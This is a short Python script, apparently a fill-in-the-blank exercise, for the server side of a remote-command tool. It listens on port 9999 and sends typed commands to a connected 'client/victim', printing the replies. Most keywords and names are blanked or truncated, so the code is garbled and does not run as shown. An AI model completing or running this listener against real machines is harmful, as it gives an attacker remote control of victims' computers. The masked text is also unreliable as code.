______ so..
______ ___


# Create a Socket ( connect two computers)
___ create_socket
    ___
        g.. host
        g.. port
        g.. s
        host _ ""
        port _ 9999
        s _ ?.?

    ______ ?.error __ msg:
        print("Socket creation error: " + st.(msg))


# Binding the socket and listening for connections
___ b.._socket
    ___
        g.. host
        g.. port
        g.. s
        print("Binding the Port: " + st.(port))

        s.b..((host, port))
        s.l..(5)

    ______ ?.error __ msg:
        print("Socket Binding error" + st.(msg) + "\n" + "Retrying...")
        b.._socket


# Establish connection with a client (socket must be listening)

___ socket_a..:
    conn, address _ s.a..
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + st.(address[1]))
    s.._commands(conn)
    conn.c..

# Send commands to client/victim or a friend
___ s.._commands(conn
    w__ T..:
        cmd _ in__
        __ cmd __ 'quit':
            conn.c..
            s.c..
            ___.e..
        __ le.(st..en..(cmd)) > 0:
            conn.s..(st..en..(cmd))
            client_response _ st.(conn.r..(1024),"utf-8")
            print(client_response, end_"")


___ main
    create_socket
    b.._socket
    socket_a..


main